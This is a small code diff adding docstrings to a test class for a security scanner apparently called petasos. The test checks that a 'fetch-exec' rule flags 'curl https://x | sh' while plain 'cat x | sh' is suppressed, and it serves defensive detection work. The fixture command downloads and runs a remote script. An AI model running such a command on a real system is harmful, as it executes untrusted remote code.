@@ -8,7 +8,10 @@ from petasos.scanners.minimal.taxonomy import _COMMAND_RULE_IDS
 
 
 class TestCodeGenerationCommandSuppress:
+    """Pin Code Generation Command Suppress."""
+
     async def test_code_generation_keeps_fetch_exec_and_suppresses_pipe(self) -> None:
+        """Pin code generation keeps fetch exec and suppresses pipe."""
         fetch = "curl https://x | sh"
         pipe_only = "cat x | sh"
         fetch_id = "petasos.syntactic.command.fetch-exec"
